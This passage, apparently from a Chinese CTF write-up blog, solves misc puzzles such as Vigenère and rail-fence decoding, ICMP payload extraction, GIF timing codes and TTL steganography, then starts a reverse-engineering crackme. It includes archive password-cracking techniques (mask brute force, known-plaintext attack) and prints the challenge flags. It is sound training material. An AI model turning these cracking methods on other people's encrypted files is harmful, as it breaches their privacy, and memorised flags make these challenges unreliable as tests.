<pre class="line-numbers language-none"><code class="language-none">aababacbbdbdccccdcdcdbbcccbcbbcbbaababaaaaaaaaaaaaaaaaaakey&#123;xinan&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>​    然后看<code>233.rar</code>这个文件，文件内压缩有一个小文件但是这个文件很大，肯定是格式错误导致第二个文件没有显示出来，用010editor打开提示第三个rar块里面有crc错误，对比其他的块发现错了一个字节，改正即可<code>7A =&gt; 74</code>。</p>
<p>​    后又得到一个png的文件，stegsolve打开之后在蓝色0通道发现一张二维码</p>
<p><img src="/2021/05/28/CTF/image-20210804174032957.png" alt=" "></p>
<pre class="line-numbers language-none"><code class="language-none">ci&#123;v3erf_0tygidv2_fc0&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>结合上面的key进行维吉尼亚解密</p>
<p><img src="/2021/05/28/CTF/image-20210804175251645.png" alt></p>
<pre class="line-numbers language-none"><code class="language-none">fa&#123;i3eei_0llgvgn2_sc0&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="/2021/05/28/CTF/image-20210804175346375.png" alt></p>
<pre class="line-numbers language-none"><code class="language-none">&#x3D;&gt;栅栏密码
flag&#123;vig3ne2e_is_c00l&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<h3 id="特殊数据"><a href="#特殊数据" class="headerlink" title="特殊数据"></a>特殊数据</h3><h4 id="蜘蛛侠呀"><a href="#蜘蛛侠呀" class="headerlink" title="蜘蛛侠呀"></a>蜘蛛侠呀</h4><p>每段icmp数据后面都跟着有一些有用处的数据，使用tshark命令将其分离出来</p>
<pre class="line-numbers language-none"><code class="language-none">tshark -r out.pcap -T fields -e data &gt; data.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>然后写个脚本处理一下数据</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> base64
<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> long_to_bytes

<span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'data.txt'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token builtin">file</span><span class="token punctuation">:</span>
    data <span class="token operator">=</span> <span class="token builtin">file</span><span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span>
data1 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    tmp <span class="token operator">=</span> data<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> tmp <span class="token operator">==</span> <span class="token string">''</span><span class="token punctuation">:</span>
        <span class="token keyword">continue</span>
    data1<span class="token punctuation">.</span>append<span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span><span class="token string">'0x'</span> <span class="token operator">+</span> tmp<span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
data <span class="token operator">=</span> data1<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">]</span>

content <span class="token operator">=</span> <span class="token string">b''</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    tmp <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>data<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>
    content <span class="token operator">+=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>tmp<span class="token punctuation">)</span>

<span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'out.zip'</span><span class="token punctuation">,</span> <span class="token string">'wb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token builtin">file</span><span class="token punctuation">:</span>
    <span class="token builtin">file</span><span class="token punctuation">.</span>write<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>然后获得了一张flag.gif的动图，没发现什么特殊之处，打开wp发现是帧与帧之间的时间是不同的，使用下面的命令获取帧与帧之间的时间间隔。</p>
<pre class="line-numbers language-sh" data-language="sh"><code class="language-sh">└─$ identify -format &quot;%T&quot; flag.gif
2050502050502050205020202050202020205050205020502050205050505050202050502020205020505050205020206666<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> long_to_bytes

s <span class="token operator">=</span> <span class="token string">'205050205050205020502020205020202020505020502050205020505050505020205050202020502050505020502020'</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'20'</span><span class="token punctuation">,</span> <span class="token string">'0'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'50'</span><span class="token punctuation">,</span> <span class="token string">'1'</span><span class="token punctuation">)</span>
s <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token comment"># mD5_1t</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-flag" data-language="flag"><code class="language-flag">flag&#123;f0f1003afe4ae8ce4aa8e8487a8ab3b6&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h2 id="office文件相关"><a href="#office文件相关" class="headerlink" title="office文件相关"></a>office文件相关</h2><h3 id="word文件内藏文件"><a href="#word文件内藏文件" class="headerlink" title="word文件内藏文件"></a>word文件内藏文件</h3><p>因为office文件的近似于压缩包的格式，使得我们可以将想隐藏的文件藏入解压缩后的各个目录或者文件内，但是一般这样生搬硬套地隐写会导致office文件打开时内容乱码，所以对于office文件，一般来说，有内容乱码的就是文件内藏入了一些文件或者文本。</p>
<h4 id="bugku、眼见非实"><a href="#bugku、眼见非实" class="headerlink" title="bugku、眼见非实"></a>bugku、眼见非实</h4><p>这个题打开之后出现乱码，直接改后缀名为zip，解压一下找到<code>word-&gt;document.xml</code>文件，打开搜索flag发现flag<code>flag&#123;F1@g&#125;</code></p>
<h4 id="UTCTF2020-docx"><a href="#UTCTF2020-docx" class="headerlink" title="[UTCTF2020]docx"></a>[UTCTF2020]docx</h4><p>打开之后内容很正常，后缀名改为zip解压之后在media文件夹内发现flag的图片</p>
<p><img src="/2021/05/28/CTF/image23.png" alt></p>
<pre class="line-numbers language-flag" data-language="flag"><code class="language-flag">utflag&#123;unz1p_3v3ryth1ng&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h2 id="压缩包密码"><a href="#压缩包密码" class="headerlink" title="压缩包密码"></a>压缩包密码</h2><h3 id="buu、-GUET-CTF2019-zips"><a href="#buu、-GUET-CTF2019-zips" class="headerlink" title="buu、[GUET-CTF2019]zips"></a>buu、[GUET-CTF2019]zips</h3><p><strong>TAG:伪加密、掩码爆破</strong></p>
<p>真加密爆破得第一层得口令为<code>723456</code>，第二层是个简单的伪加密，解出来得<code>flag.zip</code>、<code>setup.sh</code></p>
<pre class="line-numbers language-none"><code class="language-none">print(__import__(&#39;time&#39;).time())  # setup.sh文件的主要python代码<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>意思就是取出当前的时间作为<code>flag.zip</code>压缩包的密码，这里先看一下这个密码的格式(执行一下上面的python2代码)</p>
<pre class="line-numbers language-none"><code class="language-none">1622897453.55<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>太长了，爆破估计是不太可能的，但是注意到这里有上一次的修改日期，有可能进行掩码爆破</p>
<p><img src="/2021/05/28/CTF/image-20210605204224196.png" alt></p>
<p>就是对小数点之后的内容进行爆破，将<code>2019-5-17 16:40:15</code>转换为时间戳为<code>1558082415</code>，设置初始的掩码为<code>1558082415.??</code>，如果没找到，就一位一位地向前移动掩码，最后掩码为<code>155808????.??</code>是获得口令为<code>1558080832.15</code>，解压得flag：</p>
<pre class="line-numbers language-none"><code class="language-none">flag&#123;fkjabPqnLawhvuikfhgzyffj&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h3 id="buu、-MRCTF2020-千层套路"><a href="#buu、-MRCTF2020-千层套路" class="headerlink" title="buu、[MRCTF2020]千层套路"></a>buu、[MRCTF2020]千层套路</h3><p><strong>TAG：zip多层加密、二维码像素、python脚本解</strong></p>
<p>给的时zip文件，套了很多层，每一层的密码就是这一层的压缩文件的文件名(不带上后缀名的文件名)，一层层解用脚本即可</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> zipfile
<span class="token keyword">import</span> os
name <span class="token operator">=</span> <span class="token string">'0573'</span>
<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
    <span class="token keyword">with</span> zipfile<span class="token punctuation">.</span>ZipFile<span class="token punctuation">(</span>name <span class="token operator">+</span> <span class="token string">'.zip'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> ziip<span class="token punctuation">:</span>
        ziip<span class="token punctuation">.</span>extractall<span class="token punctuation">(</span>pwd<span class="token operator">=</span>name<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        delname <span class="token operator">=</span> name
        name <span class="token operator">=</span> ziip<span class="token punctuation">.</span>filelist<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>filename<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">]</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span>
    os<span class="token punctuation">.</span>remove<span class="token punctuation">(</span>delname <span class="token operator">+</span> <span class="token string">'.zip'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>得出文件<code>qr.zip</code>，解压出txt文件，用脚本再转成图片，200x200的图片</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> plt

<span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'qr.txt'</span><span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> data<span class="token punctuation">:</span>
    a <span class="token operator">=</span> data<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span>
<span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> y <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        aa <span class="token operator">=</span> a<span class="token punctuation">[</span>x<span class="token operator">*</span><span class="token number">200</span> <span class="token operator">+</span> y<span class="token punctuation">]</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>x<span class="token operator">*</span><span class="token number">200</span> <span class="token operator">+</span> y<span class="token punctuation">)</span>
        <span class="token keyword">if</span> <span class="token string">'255'</span> <span class="token keyword">in</span> <span class="token builtin">str</span><span class="token punctuation">(</span>aa<span class="token punctuation">)</span><span class="token punctuation">:</span>
            plt<span class="token punctuation">.</span>scatter<span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">,</span>c<span class="token operator">=</span><span class="token string">'r'</span><span class="token punctuation">,</span>marker<span class="token operator">=</span><span class="token string">'x'</span><span class="token punctuation">)</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            plt<span class="token punctuation">.</span>scatter<span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">,</span>c<span class="token operator">=</span><span class="token string">'b'</span><span class="token punctuation">,</span>marker<span class="token operator">=</span><span class="token string">'x'</span><span class="token punctuation">)</span>
plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="/2021/05/28/CTF/image-20210606142548031.png" alt></p>
<p>用手机QQ扫一下得flag(QQ我滴超人)</p>
<pre class="line-numbers language-none"><code class="language-none">MRCTF&#123;ta01uyout1nreet1n0usandtimes&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h3 id="buu、真实的压缩包"><a href="#buu、真实的压缩包" class="headerlink" title="buu、真实的压缩包"></a>buu、真实的压缩包</h3><p>给出两个压缩包，一个名为虚假的压缩包、一个名为真实的压缩包。虚假的压缩包为伪加密，里面是个简单的rsa</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> gmpy2

p <span class="token operator">=</span> <span class="token number">11</span>
q <span class="token operator">=</span> <span class="token number">3</span>
n <span class="token operator">=</span> <span class="token number">33</span>
phi <span class="token operator">=</span> <span class="token number">20</span>
c <span class="token operator">=</span> <span class="token number">26</span>
e <span class="token operator">=</span> <span class="token number">3</span>

d <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span> phi<span class="token punctuation">)</span>
m <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> d<span class="token punctuation">,</span> n<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"key: 答案是</span><span class="token interpolation"><span class="token punctuation">&#123;</span>m<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>然后解压出真实的压缩包，图片为高度隐写</p>
<p><img src="/2021/05/28/CTF/image-20210804214154795.png" alt></p>
<p>然后将亦真亦假文件与字符5进行异或，下面是脚本</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'亦真亦假'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token builtin">file</span><span class="token punctuation">:</span>
    data <span class="token operator">=</span> <span class="token builtin">file</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
    data <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span>

data1 <span class="token operator">=</span> <span class="token string">""</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> data<span class="token punctuation">:</span>
    tmp <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token string">'0x'</span> <span class="token operator">+</span> i<span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">5</span>
    data1 <span class="token operator">+=</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>tmp<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span>


<span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'res'</span><span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token builtin">file</span><span class="token punctuation">:</span>
    <span class="token builtin">file</span><span class="token punctuation">.</span>write<span class="token punctuation">(</span>data1<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>然后新建一个空白文件，将上面得出来的结果复制进去就行了</p>
<p><img src="/2021/05/28/CTF/image-20210804222354932.png" alt></p>
<p>然后发现是word应该，后缀名改为doc，颜色隐藏文本</p>
<p><img src="/2021/05/28/CTF/image-20210804222507880.png" alt></p>
<pre class="line-numbers language-flag" data-language="flag"><code class="language-flag">FLAG&#123;_th2_7ru8_2iP_&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h3 id="buu、-ACTF新生赛2020-明文攻击"><a href="#buu、-ACTF新生赛2020-明文攻击" class="headerlink" title="buu、[ACTF新生赛2020]明文攻击"></a>buu、[ACTF新生赛2020]明文攻击</h3><p>题目提示，明文攻击。</p>
<p>一层层打开发现图片与带密码的压缩包，压缩包里面有两个文件，根据题目提示，思路应该是从图片里面提取出来一个明文，借以解开压缩包的密码，使用。那就先对图片进行操作，但是很明显使用foremost都没分离出来，那就是后面的格式有点错误了，只能手动用winhex分了。</p>
<p><img src="/2021/05/28/CTF/image-20210910184341499.png" alt></p>
<p>打开发现里面是<code>flag.txt</code>，明文攻击的要素都满足了，打开工具直接一把梭了。</p>
<p><img src="/2021/05/28/CTF/image-20210911002725745.png" alt></p>
<pre class="line-numbers language-flag" data-language="flag"><code class="language-flag">ACTF&#123;3te9_nbb_ahh8&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h2 id="给出字串"><a href="#给出字串" class="headerlink" title="给出字串"></a>给出字串</h2><blockquote>
<p>misc中常见给出字串让转为文件或者其他什么东西的题型，就是给你一串或长或短的数字，让你解一下这段内容，转换一下获得文件或者明文。</p>
</blockquote>
<h3 id="TTL隐写"><a href="#TTL隐写" class="headerlink" title="TTL隐写"></a>TTL隐写</h3><blockquote>
<p>​    IP报文在路由间穿梭的时候每经过一个路由，TTL就会减1，当TTL为0的时候，该报文就会被丢弃。TTL所占的位数是8位，也就是0-255的范围，但是在大多数情况下通常只需要经过很小的跳数就能完成报文的转发，远远比上限255小得多，所以我们可以用TTL值的前两位来进行传输隐藏数据。<br>​    如：须传送H字符，只需把H字符换成二进制，每两位为一组，每次填充到TTL字段的开头两位并把剩下的6位设置为1（xx111111），这样发4个IP报文即可传送1个字节。</p>
</blockquote>
<h4 id="SWPU2019-Network"><a href="#SWPU2019-Network" class="headerlink" title="[SWPU2019]Network"></a>[SWPU2019]Network</h4><p>给出的文件的内容只有<code>63 127 191 255</code>四个数字，此时考虑ttl隐写。</p>
<p><code>00 替换 63 01 替换 127 10 替换 191 11 替换 255</code></p>
<p>写出脚本</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> binascii

<span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'attachment.txt'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token builtin">file</span><span class="token punctuation">:</span>
    data <span class="token operator">=</span> <span class="token builtin">file</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'63\n'</span><span class="token punctuation">,</span> <span class="token string">'00'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'127\n'</span><span class="token punctuation">,</span> <span class="token string">'01'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'191\n'</span><span class="token punctuation">,</span> <span class="token string">'10'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'255\n'</span><span class="token punctuation">,</span> <span class="token string">'11'</span><span class="token punctuation">)</span>
    data <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span>
    data <span class="token operator">=</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span>

<span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'file.txt'</span><span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token builtin">file</span><span class="token punctuation">:</span>
    <span class="token builtin">file</span><span class="token punctuation">.</span>write<span class="token punctuation">(</span>data<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>​    再将文件内的内容复制粘贴到winhex里面，然后似乎文件头没有<code>50</code>不知道是不是我个人的问题。</p>
<p>​    然后zip伪加密，务必使用010editor，看起来zip伪加密更清晰一点。</p>
<p>​    里面又是base家族的多重加密，使用我个人开发的专属解题脚本解出flag</p>
<pre class="line-numbers language-none"><code class="language-none">flag&#123;189ff9e5b743ae95f940a6ccc6dbd9ab&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="/2021/05/28/CTF/image-20210804233925939.png" alt></p>
<h2 id="含逆向的misc"><a href="#含逆向的misc" class="headerlink" title="含逆向的misc"></a>含逆向的misc</h2><h3 id="MRCTF2020-CyberPunk"><a href="#MRCTF2020-CyberPunk" class="headerlink" title="[MRCTF2020]CyberPunk"></a>[MRCTF2020]CyberPunk</h3><p>这题很简单，直接改计算机的系统时间即可</p>
<p><img src="/2021/05/28/CTF/image-20200917204620215.png" alt></p>
<p><img src="/2021/05/28/CTF/image-20200917204556945.png" alt></p>
<pre class="line-numbers language-none"><code class="language-none">MRCTF&#123;We1cOm3_70_cyber_security&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h1 id="REVERSE"><a href="#REVERSE" class="headerlink" title="REVERSE"></a>REVERSE</h1><h2 id="方向介绍与解题思路"><a href="#方向介绍与解题思路" class="headerlink" title="方向介绍与解题思路"></a>方向介绍与解题思路</h2><h3 id="方向的简单介绍"><a href="#方向的简单介绍" class="headerlink" title="方向的简单介绍"></a>方向的简单介绍</h3><p>reverse方向在实战中表现为计算机软件破解，有一般的c与c++作为反编译内容的破解、有基于c#的软件的破解、有基于java的逆向破解等等。</p>
<p>而在CTF中，reverse的出题模式一般有下面的几种</p>
<h3 id="一般的逆向题"><a href="#一般的逆向题" class="headerlink" title="一般的逆向题"></a>一般的逆向题</h3><h3 id="一般的迷宫题"><a href="#一般的迷宫题" class="headerlink" title="一般的迷宫题"></a>一般的迷宫题</h3><h2 id="一般逆向-啥都没有，简单的算法"><a href="#一般逆向-啥都没有，简单的算法" class="headerlink" title="一般逆向(啥都没有，简单的算法)"></a>一般逆向(啥都没有，简单的算法)</h2><h3 id="ACTF新生赛2020-easyre"><a href="#ACTF新生赛2020-easyre" class="headerlink" title="[ACTF新生赛2020]easyre"></a>[ACTF新生赛2020]easyre</h3><p>先查pe，注意到是UPX壳，直接拉到虚拟机内脱壳</p>
<p><img src="/2021/05/28/CTF/image-20210531101308798.png" alt="image-20210531101308798"></p>
<p>然后直接拖入ida32，跟踪到如下的主要代码</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  _BYTE v4<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [esp+12h] [ebp-2Eh] BYREF</span>
  _DWORD v5<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [esp+1Eh] [ebp-22h]</span>
  _BYTE v6<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [esp+2Ah] [ebp-16h] BYREF</span>
  <span class="token keyword">int</span> v7<span class="token punctuation">;</span> <span class="token comment">// [esp+2Fh] [ebp-11h]</span>
  <span class="token keyword">int</span> v8<span class="token punctuation">;</span> <span class="token comment">// [esp+33h] [ebp-Dh]</span>
  <span class="token keyword">int</span> v9<span class="token punctuation">;</span> <span class="token comment">// [esp+37h] [ebp-9h]</span>
  <span class="token keyword">char</span> v10<span class="token punctuation">;</span> <span class="token comment">// [esp+3Bh] [ebp-5h]</span>
  <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment">// [esp+3Ch] [ebp-4h]</span>

  <span class="token function">sub_401A10</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">qmemcpy</span><span class="token punctuation">(</span>v4<span class="token punctuation">,</span> <span class="token string">"*F'\"N,\"(I?+@"</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>v4<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Please input:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> v6<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> v6<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">65</span> <span class="token operator">||</span> v6<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">67</span> <span class="token operator">||</span> v6<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">84</span> <span class="token operator">||</span> v6<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">70</span> <span class="token operator">||</span> v6<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">123</span> <span class="token operator">||</span> v10 <span class="token operator">!=</span> <span class="token number">125</span> <span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
  v5<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> v7<span class="token punctuation">;</span>
  v5<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> v8<span class="token punctuation">;</span>
  v5<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> v9<span class="token punctuation">;</span>
  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">11</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span> v4<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">!=</span> byte_402000<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>v5 <span class="token operator">+</span> i<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token punctuation">)</span>
      <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"You are correct!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
